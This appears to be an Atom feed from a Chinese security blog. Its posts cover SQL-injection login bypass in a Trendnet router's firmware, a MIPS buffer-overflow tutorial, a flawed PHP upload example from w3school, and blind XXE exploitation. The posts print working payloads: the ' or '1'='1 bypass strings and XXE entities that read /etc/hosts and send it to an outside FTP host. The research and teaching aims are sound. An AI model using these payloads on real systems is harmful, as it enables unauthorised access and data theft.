<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[xd_xd's blog]]></title>
  
  <link href="/atom.xml" rel="self"/>
  <link href="http://xdxd.love/"/>
  <updated>2016-09-22T06:20:12.000Z</updated>
  <id>http://xdxd.love/</id>
  
  <author>
    <name><![CDATA[xd_xd]]></name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title><![CDATA[逆向路由器固件之动态调试]]></title>
    <link href="http://xdxd.love/2016/09/20/%E9%80%86%E5%90%91%E8%B7%AF%E7%94%B1%E5%99%A8%E5%9B%BA%E4%BB%B6%E4%B9%8B%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/"/>
    <id>http://xdxd.love/2016/09/20/逆向路由器固件之动态调试/</id>
    <published>2016-09-20T09:09:52.000Z</published>
    <updated>2016-09-22T06:20:12.000Z</updated>
    <content type="html"><![CDATA[<p>本文根据devttyS0的教程<a href="http://www.devttys0.com/2011/09/exploiting-embedded-systems-part-2/" target="_blank" rel="external">Exploiting Embedded Systems – Part 2</a>和<a href="http://www.devttys0.com/2011/09/exploiting-embedded-systems-part-3/" target="_blank" rel="external">Exploiting Embedded Systems – Part 3</a>复现Trendnet一个路由器的SQL注入漏洞分析过程。部门内容直接翻译引用自原文，可以看做是原文的翻译整理。</p>
<p>相关的环境搭建<a href="http://bbs.pediy.com/showthread.php?t=212369" target="_blank" rel="external">详细的路由器漏洞分析环境搭建教程</a>。</p>
<h2 id="静态分析">静态分析</h2><p>存在漏洞的固件<a href="http://download.trendnet.com/TEW-654TR/firmware/FW_TEW-654TR_v1.0R(1.10.12" target="_blank" rel="external">下载地址</a>.zip),最新版固件<a href="http://www.trendnet.com/support/supportdetail.asp?prod=175_TEW-654TR" target="_blank" rel="external">下载地址</a></p>
<p>使用binwalk解包：</p>
<p><img src="/images/nixiangmips1.png" alt=""></p>
<p>查看登录接口的URL和参数，在解包的文件中找到my_cgi.cgi文件。</p>
<p><img src="/images/nixiangmips2.png" alt=""></p>
<p>在my_cgi.cgi中查找user_name和user_pwd两个参数。</p>
<p><img src="/images/nixiangmips3.png" alt=""></p>
<p>看起来<code>select level from user where user_name=&#39;%s&#39; and user_pwd=&#39;%s&#39;</code>像是登录的时候查询SQL的参数，使用IDA载入my_cgi.cgi。查询”select level from user where user_name“字符串，可以定位到do_login函数。</p>
<p><img src="/images/nixiangmips4.png" alt=""></p>
<h2 id="动态分析">动态分析</h2><p>分析do_login函数，在exec_sql函数执行之前下断点。<br><img src="/images/nixiangmips5.png" alt=""></p>
<p>使用如下脚本运行my_cgi.cgi:</p>
<p>#!/bin/bash</p>
<pre><code>INPUT=<span class="string">"<span class="variable">$1</span>"</span>
LEN=$(<span class="built_in">echo</span> -n <span class="string">"<span class="variable">$INPUT</span>"</span> | wc -c)
PORT=<span class="string">"1234"</span>
<span class="keyword">if</span> [ <span class="string">"<span class="variable">$LEN</span>"</span> == <span class="string">"0"</span> ] || [ <span class="string">"<span class="variable">$INPUT</span>"</span> == <span class="string">"-h"</span> ] || [ <span class="string">"<span class="variable">$UID</span>"</span> != <span class="string">"0"</span> ]
<span class="keyword">then</span>
    <span class="built_in">echo</span> <span class="operator">-e</span> <span class="string">"\nUsage: sudo <span class="variable">$0</span> &lt;POST data&gt;\n"</span>
    <span class="built_in">exit</span> <span class="number">1</span>
<span class="keyword">fi</span>
cp $(<span class="built_in">which</span> qemu-mipsel-static) ./qemu
<span class="built_in">echo</span> <span class="string">"<span class="variable">$INPUT</span>"</span> | chroot . qemu -E REQUEST_METHOD=<span class="string">"POST"</span> -E CONTENT_LENGTH=<span class="variable">$LEN</span> -E CONTENT_TYPE=<span class="string">"multipart/x-form-data"</span> -E REMOTE_ADDR=<span class="string">"1.1.1.100"</span> -g <span class="variable">$PORT</span> /usr/bin/my_cgi.cgi <span class="number">2</span>&gt;/dev/null
</code></pre><p>需要放在解压出来的squashfs-root目录下执行。</p>
<pre><code>bash cgi.sh <span class="string">"request=login&amp;user_name=admin&amp;user_pwd='<span class="variable">%20or</span><span class="variable">%20</span>'1'<span class="variable">%3D</span>'1"</span>
</code></pre><p>然后IDA连接到GDB端口进行调试，具体方法参考<a href="http://bbs.pediy.com/showthread.php?t=212369" target="_blank" rel="external">详细的路由器漏洞分析环境搭建教程</a>。按F9执行程序到exec_sql的断点处。可以看到寄存器$a1的值为指向sql字符串的指针。</p>
<p><img src="/images/nixiangmips6.png" alt=""><br>在hex view中跳转到对应的地址，可以看到sql字符串的值为：</p>
<pre><code><span class="operator"><span class="keyword">select</span> <span class="keyword">level</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> user_name=<span class="string">'admin'</span> <span class="keyword">and</span> user_pwd=<span class="string">''</span> <span class="keyword">or</span> <span class="string">'1'</span>=<span class="string">'1'</span></span>
</code></pre><p>表明我们输入的字符串已经拼接到SQL语句中。</p>
<p><img src="/images/nixiangmips7.png" alt=""></p>
<p>采用同样的方式动态调试最新版固件，可以发现漏洞已经修复。最新版对输入的参数进行了长度检查，并且检查是否含有单引号。可见这个点除了SQL，应该是也存在溢出的。</p>
<p>进行长度检查。<br><img src="/images/nixiangmips8.png" alt=""></p>
<p>检查是否存在单引号避免SQL注入。<br><img src="/images/nixiangmips9.png" alt=""></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>本文根据devttyS0的教程<a href="http://www.devttys0.com/2011/09/exploiting-embedded-systems-part-2/" target="_blank" rel="external">Exploiting Em]]>
    </summary>
    
      <category term="mips" scheme="http://xdxd.love/tags/mips/"/>
    
      <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[逆向路由器固件之SQL注入]]></title>
    <link href="http://xdxd.love/2016/09/20/%E9%80%86%E5%90%91%E8%B7%AF%E7%94%B1%E5%99%A8%E5%9B%BA%E4%BB%B6%E4%B9%8BSQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://xdxd.love/2016/09/20/逆向路由器固件之SQL注入/</id>
    <published>2016-09-20T08:44:34.000Z</published>
    <updated>2016-09-20T08:50:46.000Z</updated>
    <content type="html"><![CDATA[<p>翻译自<a href="http://www.devttys0.com/2011/09/exploiting-embedded-systems-part-2/" target="_blank" rel="external">devttys0</a>,发表在<a href="http://www.freebuf.com/vuls/76755.html" target="_blank" rel="external">freebuf</a></p>
<h2 id="另寻他径">另寻他径</h2><p>在前面的内容中，我们使用TEW-654TR路由器的tftp服务实现了获取目标的管理权限。但是要是tftp没有开放到外网怎么办？另寻他径：在这一篇中会我们来分析一个web应用上的漏洞。</p>
<p>初步分析</p>
<p><img src="http://image.3001.net/images/20150831/1441019914573.png" alt=""></p>
<p>使用代理软件抓登录时候的数据包，可以看到发送的http请求如上图所示。数据发送给了my_cgi.cgi这个脚本。我们分析一下这个文件看看。</p>
<pre><code>➜  rootfs git:(master) ✗ find . -name my_cgi<span class="class">.cgi</span>
./usr/bin/my_cgi<span class="class">.cgi</span>
➜  rootfs git:(master) ✗ file ./usr/bin/my_cgi<span class="class">.cgi</span>
./usr/bin/my_cgi<span class="class">.cgi</span>: ELF <span class="number">32</span>-bit LSB executable, MIPS, MIPS-II version <span class="number">1</span> (SYSV), dynamically linked (uses shared libs), stripped
</code></pre><p>通过抓包知道用户在登录页面输入的两个参数分别是’user_name’和’user_pwd’，那么我们在CGI脚本中搜索这两个字符串看看。</p>
<p><img src="http://image.3001.net/images/20150831/14410199362768.png" alt="my_cgi_login2.png
"></p>
<p>有几行字符串看起来是SQL查询的语句，尤其是：</p>
<pre><code><span class="operator"><span class="keyword">select</span> <span class="keyword">level</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> user_name=<span class="string">'%s'</span> <span class="keyword">and</span> user_pwd=<span class="string">'%s'</span></span>
</code></pre><p>看起来应该是根据用户名和密码去数据库查询，看密码是否正确。上一篇文章的分析我们可以知道，这个路由器是使用SQLite做数据库存储密码的。</p>
<p>使用IDA载入my_cgi.cgi。查询”select level from user where user_name“字符串，可以定位到do_login函数。</p>
<p><img src="http://image.3001.net/images/20150831/14410200092005.png" alt="my_cgi_login3.png"></p>
<h2 id="假设&amp;猜想">假设&amp;猜想</h2><p>用户提交的用户名和密码大概是传递给sprintf函数生成SQL语句。存储在sql变量中，最后进入exec_sql函数。看起来这个过程没有对数据进行转义。除非数据在进入do_login函数之前或者在exec_sql中有做转义，不然很可能存在SQL注入的漏洞。如果我们的假设是正确的，数据没有经过处理进入了SQL语句中，那么我们可以使用最传统的万能密码来绕过登录验证：</p>
<pre><code><span class="string">' or '</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span>
</code></pre><p>最后执行的sql就会变成</p>
<pre><code><span class="operator"><span class="keyword">select</span> <span class="keyword">level</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> user_name=<span class="string">'admin'</span> <span class="keyword">and</span> user_pwd=<span class="string">''</span> <span class="keyword">or</span> <span class="string">'1'</span>=<span class="string">'1'</span></span>
</code></pre><p>这样查询语句就会返回成功的结果。</p>
<h2 id="验证猜想">验证猜想</h2><p>我们实验一下：</p>
<p><img src="http://image.3001.net/images/20150831/14410200328237.png" alt="my_cgi_login4.png"></p>
<p>果然跟我们预期的一样。这里需要注意的是能够以管理员身份登陆是需要一定运气的。我们构造的SQL语句where条件是or 1=1所以会返回所有的数据。恰好管理员的记录是第一条所以以管理员的身份登陆了。如果第一条是一个普通用户的数据，那么就会以普通用户的身份登陆了。为了确保一定以管理员身份登陆，可以构造如下语句：</p>
<pre><code>' or level = (<span class="operator"><span class="keyword">select</span> <span class="keyword">level</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">level</span> <span class="keyword">desc</span> <span class="keyword">limit</span> <span class="number">1</span>)<span class="comment">/*</span></span>
</code></pre><p>上面这个语句可以确保最后查询出来的数据室level最高的用户的数据。</p>
<p>这次我们终于看到了逆向分析的冰山一角。下一篇将会讨论使用Qemu虚拟机运行路由器固件，动态调试相关的内容。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>翻译自<a href="http://www.devttys0.com/2011/09/exploiting-embedded-systems-part-2/" target="_blank" rel="external">devttys0</a>,发表在<a href="]]>
    </summary>
    
      <category term="mips" scheme="http://xdxd.love/tags/mips/"/>
    
      <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[mips架构缓冲区溢出学习二]]></title>
    <link href="http://xdxd.love/2016/09/18/mips%E6%9E%B6%E6%9E%84%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0%E4%BA%8C/"/>
    <id>http://xdxd.love/2016/09/18/mips架构缓冲区溢出学习二/</id>
    <published>2016-09-18T01:59:49.000Z</published>
    <updated>2016-09-20T02:56:35.000Z</updated>
    <content type="html"><![CDATA[<p><a href="http://xdxd.love/2016/09/08/%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84mips%E6%9E%B6%E6%9E%84%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/">mips架构缓冲区溢出学习一</a>中介绍了mips栈溢出的基本原理。这里介绍一下ROP的方式实现命令执行。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p><a href="http://xdxd.love/2016/09/08/%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84mips%E6%9E%B6%E6%9E%84%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA]]>
    </summary>
    
      <category term="mips" scheme="http://xdxd.love/tags/mips/"/>
    
      <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[w3school上示例代码的安全漏洞]]></title>
    <link href="http://xdxd.love/2016/09/14/w3school%E4%B8%8A%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81%E7%9A%84%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/"/>
    <id>http://xdxd.love/2016/09/14/w3school上示例代码的安全漏洞/</id>
    <published>2016-09-14T05:51:05.000Z</published>
    <updated>2016-09-14T06:59:25.000Z</updated>
    <content type="html"><![CDATA[<p>这个漏洞原理本身比较简单，而且很古老了。这里主要想说明一下，在w3school这样的平台上还存在着这样的代码说明我们对编写安全的代码还是不够重视。w3school上的示例对于初学者简单明了。很多人应该都看这个网站学习过web相关的知识。</p>
<p>我们用Google搜索<code>php 文件上传</code>或者英文的<code>php file upload</code> </p>
<p><img src="/images/phpupload2.png" alt=""><br><img src="/images/phpupload1.png" alt=""></p>
<p>第一个结果就是w3school的教学页面，而这个教程中给出的示例代码是存在安全漏洞的。</p>
<p>完整的代码如下：<a href="http://www.w3school.com.cn/php/php_file_upload.asp" target="_blank" rel="external">参考地址</a></p>
<p>上传的表单：</p>
<pre><code><span class="tag">&lt;<span class="title">html</span>&gt;</span>
<span class="tag">&lt;<span class="title">body</span>&gt;</span>
<span class="tag">&lt;<span class="title">form</span> <span class="attribute">action</span>=<span class="value">"upload_file.php"</span> <span class="attribute">method</span>=<span class="value">"post"</span>
<span class="attribute">enctype</span>=<span class="value">"multipart/form-data"</span>&gt;</span>
<span class="tag">&lt;<span class="title">label</span> <span class="attribute">for</span>=<span class="value">"file"</span>&gt;</span>Filename:<span class="tag">&lt;/<span class="title">label</span>&gt;</span>
<span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"file"</span> <span class="attribute">name</span>=<span class="value">"file"</span> <span class="attribute">id</span>=<span class="value">"file"</span> /&gt;</span> 
<span class="tag">&lt;<span class="title">br</span> /&gt;</span>
<span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"submit"</span> <span class="attribute">name</span>=<span class="value">"submit"</span> <span class="attribute">value</span>=<span class="value">"Submit"</span> /&gt;</span>
<span class="tag">&lt;/<span class="title">form</span>&gt;</span>
<span class="tag">&lt;/<span class="title">body</span>&gt;</span>
<span class="tag">&lt;/<span class="title">html</span>&gt;</span>
</code></pre><p>处理的php脚本：</p>
<pre><code><span class="php"><span class="preprocessor">&lt;?php</span>
<span class="keyword">if</span> (((<span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span>)
|| (<span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)
|| (<span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/pjpeg"</span>))
&amp;&amp; (<span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"size"</span>] &lt; <span class="number">20000</span>))
  {
  <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>)
    {
    <span class="keyword">echo</span> <span class="string">"Return Code: "</span> . <span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"error"</span>] . <span class="string">"&lt;br /&gt;"</span>;
    }
  <span class="keyword">else</span>
    {
    <span class="keyword">echo</span> <span class="string">"Upload: "</span> . <span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">"&lt;br /&gt;"</span>;
    <span class="keyword">echo</span> <span class="string">"Type: "</span> . <span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"type"</span>] . <span class="string">"&lt;br /&gt;"</span>;
    <span class="keyword">echo</span> <span class="string">"Size: "</span> . (<span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"size"</span>] / <span class="number">1024</span>) . <span class="string">" Kb&lt;br /&gt;"</span>;
    <span class="keyword">echo</span> <span class="string">"Temp file: "</span> . <span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>] . <span class="string">"&lt;br /&gt;"</span>;
    <span class="keyword">if</span> (file_exists(<span class="string">"upload/"</span> . <span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"name"</span>]))
      {
      <span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">" already exists. "</span>;
      }
    <span class="keyword">else</span>
      {
      move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>],
      <span class="string">"upload/"</span> . <span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"name"</span>]);
      <span class="keyword">echo</span> <span class="string">"Stored in: "</span> . <span class="string">"upload/"</span> . <span class="variable">$_FILES</span>[<span class="string">"file"</span>][<span class="string">"name"</span>];
      }
    }
  }
<span class="keyword">else</span>
  {
  <span class="keyword">echo</span> <span class="string">"Invalid file"</span>;
  }
<span class="preprocessor">?&gt;</span></span>
</code></pre><p>文中也多次提到了文件上传的安全问题。<br><img src="/images/phpupload4.png" alt=""><br><img src="/images/phpupload5.png" alt=""></p>
<p>而为了安全，最后示例的代码中加了限制，只允许用户上传gif，jpg格式的图片。而这个限制，是通过<code>$_FILES[&quot;file&quot;][&quot;type&quot;]</code>来限制的。做安全的同学都知道，这个参数是浏览器生成传递给服务端的，虽然不是用户输入数据，但是是属于客户端传递过来的数据，也就是用户其实是可以控制这个参数的。只需要修改<code>Content-Type: image/jpeg</code> 就可以绕过这个检查，上传任意类型的文件。</p>
<p><img src="/images/phpupload6.png" alt=""></p>
<p>所以，当我们用Google搜索php文件上传，给出的第一个示例代码是存在安全漏洞的。编写安全的代码，任重而道远。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>这个漏洞原理本身比较简单，而且很古老了。这里主要想说明一下，在w3school这样的平台上还存在着这样的代码说明我们对编写安全的代码还是不够重视。w3school上的示例对于初学者简单明了。很多人应该都看这个网站学习过web相关的知识。</p>
<p>我们用Google搜索]]>
    </summary>
    
      <category term="php" scheme="http://xdxd.love/tags/php/"/>
    
      <category term="代码审计" scheme="http://xdxd.love/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[mips架构缓冲区溢出学习一]]></title>
    <link href="http://xdxd.love/2016/09/08/%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84mips%E6%9E%B6%E6%9E%84%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
    <id>http://xdxd.love/2016/09/08/一个简单的mips架构缓冲区溢出/</id>
    <published>2016-09-08T07:54:58.000Z</published>
    <updated>2016-09-13T07:12:48.000Z</updated>
    <content type="html"><![CDATA[<h2 id="缓冲区溢出">缓冲区溢出</h2><p>简单的说，缓冲区溢出就是在大缓冲区数据向小缓冲区复制的过程中，由于没有检查小缓冲区的边界或者检查不严格，导致小缓冲区不足以接受整个大缓冲区的数据，超出的部分覆盖了与小缓冲区的相邻的内存区中的其他数据而引发的内存问题。(注1)</p>
<p>mips的编译调试环境搭建参考<a href="http://bbs.pediy.com/showthread.php?t=212369" target="_blank" rel="external">详细的路由器漏洞分析环境搭建教程</a></p>
<p>示例代码：</p>
<pre><code><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span>
<span class="preprocessor">#<span class="keyword">include</span> <span class="string">"string.h"</span></span>
<span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>{
    <span class="keyword">char</span> username[<span class="number">100</span>],password[<span class="number">100</span>];
    <span class="built_in">printf</span>(<span class="string">"\nUsername: "</span>);
    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, username);
    <span class="built_in">printf</span>(<span class="string">"\nPassword: "</span>);
    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, password);
    <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(username, <span class="string">"Turing"</span>) &amp;&amp; !<span class="built_in">strcmp</span>(password, <span class="string">"1234"</span>)) {
        <span class="built_in">printf</span>(<span class="string">"Welcome to the pediy server\n"</span>);
    }<span class="keyword">else</span> {
        <span class="built_in">printf</span>(<span class="string">"Login failed\nGoodbye!\n"</span>);
    }
    <span class="keyword">return</span> <span class="number">0</span>;
}
</code></pre><p>编译代码生成可执行文件。</p>
<pre><code><span class="regexp">/root/</span>buildroot-<span class="number">2016.05</span><span class="regexp">/output/</span>host<span class="regexp">/usr/</span>bin/mipsel-linux-gcc pediy.c -o pediy -<span class="keyword">static</span>
</code></pre><p><img src="/images/mipsoverflow1.png" alt=""><br>可以看到这个程序的逻辑比较简单，她要求用户输入一个用户名和密码，然后分别存储在两个数组里。然后检查用户名和密码是否是Turing和1234，如果正确，就打印欢迎信息，如果错误就返回登录失败的信息。</p>
<p>对于一个正常的应用来说，100个字符的用户名应该足够了。但是如果有人输入了超过100个字符的用户名会有什么情况发生呢。scanf并不会去检查边界，而是盲目的接受所有的字符。</p>
<p>我们来测试一下输入超过100个字符的用户名。<br><img src="/images/mipsoverflow2.png" alt=""><br>可以看到程序正常的运行结束之后抛出了一个提示：</p>
<pre><code>qemu: uncaught <span class="keyword">target</span> signal 11 (Segmentation fault) - core dumped
Segmentation fault
</code></pre><p>使用如下命令运行程序，用ida进行调试：</p>
<pre><code>chroot . ./qemu-mipsel-<span class="keyword">static</span> -g <span class="number">1234</span> ./pediy
</code></pre><p>运行程序程序，输入超长的用户名，发现程序运行0x61616161处的指令时发生了崩溃，引发了段故障错误。崩溃现场如图：</p>
<p><img src="/images/mipsoverflow3.png" alt=""></p>
<p>可以看到stack view中栈空间充满了61616161，而且寄存器$RA,$FP的值都是61616161，61是我们输入的用户名字母a的16进制编码。所以，超长的字符串劫持了程序的执行流程，让程序执行到了0x61616161这个我们可控的地址继续执行，而这个地址使我们随意输入的，从而导致了程序崩溃。</p>
<p>具体的mips指令架构这里就不做介绍了。可以通过反汇编查看main函数的栈空间布局。<br><img src="/images/mipsoverflow4.png" alt=""></p>
<p>基本如下图所示：<br><img src="/images/mipsoverflow5.png" alt=""><br>username和password都分配了100个字节的空间，后面是上一个函数的栈指针和保存的$ra返回地址，让当前函数结束运行之后，CPU会从$ra处开始执行命令，而基础器$ra的值是从栈空间里保存的$ra处恢复的。</p>
<p>当函数运行结束之后，由于我们输入了超长的用户名，所以栈空间的数据就变成了如下这样：<br><img src="/images/mipsoverflow6.png" alt=""><br>用户名的数据覆盖了栈上其他的数据，所以当函数运行结束，寄存器$ra从栈上恢复地址的时候，得到的是被覆盖了的地址。然后程序会从0x61616161处开始执行，这会导致不可预料的后果，大部分情况都会导致内存访问违规。</p>
<h2 id="漏洞利用">漏洞利用</h2><p>既然我们可以控制程序从一个指定的地址开始执行命令，那么如果我们知道一个以前没有权限执行的危险命令的地址，就可以通过溢出的方式欺骗程序去执行这个命令。在这个例子中我们可以尝试在没有成功登陆的情况下执行成功登陆之后的一些指令。当然要实现还是有不少苦难的，我们需要知道目标指令的地址，很可能看了几个小时的汇编依然一无所获。</p>
<p>但是既然我们控制username和password参数，可以尝试将需要执行的代码放到username的位置，然后将$ra返回地址指向我们控制的数据的地址。如下所示：</p>
<p><img src="/images/mipsoverflow7.png" alt=""></p>
<h2 id="参考资料">参考资料</h2><p><a href="https://werewblog.wordpress.com/2015/11/23/a-simple-buffer-overflow-exploit-mips-architecture/" target="_blank" rel="external">A simple buffer overflow exploit (MIPS architecture)</a><br>《解密家用路由器0day漏洞挖掘技术》<br><a href="http://bbs.pediy.com/showthread.php?t=212369" target="_blank" rel="external">详细的路由器漏洞分析环境搭建教程</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="缓冲区溢出">缓冲区溢出</h2><p>简单的说，缓冲区溢出就是在大缓冲区数据向小缓冲区复制的过程中，由于没有检查小缓冲区的边界或者检查不严格，导致小缓冲区不足以接受整个大缓冲区的数据，超出的部分覆盖了与小缓冲区的相邻的内存区中的其他数据而引发的内存问题。(注1)]]>
    </summary>
    
      <category term="mips 溢出" scheme="http://xdxd.love/tags/mips-%E6%BA%A2%E5%87%BA/"/>
    
      <category term="万物互联" scheme="http://xdxd.love/categories/%E4%B8%87%E7%89%A9%E4%BA%92%E8%81%94/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[一个blind XXE漏洞利用工具XXEinjector]]></title>
    <link href="http://xdxd.love/2016/09/08/%E4%B8%80%E4%B8%AAblind-XXE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/"/>
    <id>http://xdxd.love/2016/09/08/一个blind-XXE漏洞利用分析/</id>
    <published>2016-09-08T02:22:01.000Z</published>
    <updated>2016-09-09T01:58:19.000Z</updated>
    <content type="html"><![CDATA[<h2 id="参考资料">参考资料</h2><p><a href="https://www.t00ls.net/articles-32919.html" target="_blank" rel="external">关于Blind XXE</a><br><a href="https://jiji262.github.io/wooyun_articles/drops/%E4%BD%A0%E6%89%80%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84XML%E5%AE%89%E5%85%A8.html" target="_blank" rel="external">你所不知道的XML安全</a><br><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="external">未知攻焉知防——XXE漏洞攻防</a><br><a href="http://blog.csdn.net/u011721501/article/details/43775691" target="_blank" rel="external">XXE漏洞以及Blind XXE总结</a><br><a href="https://www.92aq.com/2016/01/31/xxeinjector-xxe.html" target="_blank" rel="external">XXEinjector – XXE自动化测试工具</a></p>
<h2 id="漏洞探测">漏洞探测</h2><p>关于XXE的分析已经有比较多的总结了。可以查看参考资料中的分析。<br>使用SYSTEM引用外部cloueye URL。可以看到服务器接收到目标服务器发来的http请求，证明存在漏洞。<br><img src="/images/onexxe1.png" alt=""></p>
<p>测试payload:</p>
<pre><code><span class="pi">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><span class="doctype">&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM "http://sss.5510eb.dnslog.info/file.dtd"&gt;%remote;]&gt;</span>
</code></pre><h2 id="文件读取">文件读取</h2><p>使用参考资料中的一些payload，发现并没有复现成功。后来发现使用<a href="https://github.com/enjoiz/XXEinjector" target="_blank" rel="external">XXEinjector</a>可以非常方便的验证漏洞。</p>
<pre><code><span class="string">.</span><span class="comment">/XXEinjector</span><span class="string">.</span><span class="comment">rb</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">host=22</span><span class="string">.</span><span class="comment">28</span><span class="string">.</span><span class="comment">98</span><span class="string">.</span><span class="comment">149</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">file=/root/XXEinjector/test</span><span class="string">.</span><span class="comment">txt</span>  <span class="literal">-</span><span class="literal">-</span><span class="comment">path=/etc/hosts</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">verbose</span> 
</code></pre><p>命令可以读取hosts文件。XXEinjector.rb会自动开启http服务提供恶意dtd和开启ftp服务接受传送回来的文件信息。</p>
<p><img src="/images/onexxe3.png" alt=""></p>
<p>经过抓包分析XXEinjector的工作原理。</p>
<p>使用的第一个payload为：</p>
<pre><code><span class="pi">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><span class="doctype">&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM "http://xxxxxx:80/file.dtd"&gt;%remote;%int;%trick;]&gt;</span><span class="tag">&lt;<span class="title">request</span> <span class="attribute">nickname</span>=<span class="value">"test"</span> <span class="attribute">serial</span>=<span class="value">"ELISALIVE2-"</span> <span class="attribute">user</span>=<span class="value">""</span> <span class="attribute">swd</span>=<span class="value">"+=="</span> <span class="attribute">port</span>=<span class="value">"0"</span> <span class="attribute">version</span>=<span class="value">"1.0"</span>&gt;</span><span class="tag">&lt;/<span class="title">request</span>&gt;</span>
</code></pre><p>file.dtd内容为：</p>
<pre><code>&lt;<span class="exclamation_mark">!</span><span class="variable">ENTITY</span> <span class="comment">% payl SYSTEM "file:///etc/hosts"&gt;</span>
&lt;<span class="exclamation_mark">!</span><span class="variable">ENTITY</span> <span class="comment">% int "&lt;!ENTITY &amp;#37; trick SYSTEM 'ftp://xxxxxxx:21/%payl;'&gt;"&gt;</span>
</code></pre><p>然后ftp就会接受到hosts文件数据。</p>
<p>使用提取的payload用burp测试可以获取数据。<br><img src="/images/onexxe2.png" alt=""></p>
<h2 id="修复方案">修复方案</h2><p>参考<a href="https://www.owasp.org/index.php/XML_External_Entity_(XXE" target="_blank" rel="external">XML_External<em>Entity</em>(XXE)_Prevention_Cheat_Sheet</a>_Prevention_Cheat_Sheet)，根据相应的库的方式禁用外部实体解析。</p>
<h2 id="备注">备注</h2><p>XXE作为一种攻击形式，在不同的环境中会有各种比较灵活的利用。<a href="https://jiji262.github.io/wooyun_articles/drops/%E4%BD%A0%E6%89%80%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84XML%E5%AE%89%E5%85%A8.html" target="_blank" rel="external">你所不知道的XML安全</a>中提到的禁用外部实体的情况下，利用uri Invocation来实现SSRF攻击。目前这个点的分析比较少，如果可以实现http的ssrf其实也是可以做不少事情的。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="参考资料">参考资料</h2><p><a href="https://www.t00ls.net/articles-32919.html" target="_blank" rel="external">关于Blind XXE</a><br><a href="htt]]>
    </summary>
    
      <category term="XXE" scheme="http://xdxd.love/tags/XXE/"/>
    
      <category term="渗透测试" scheme="http://xdxd.love/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[安卓分析工具Inspeckage介绍]]></title>
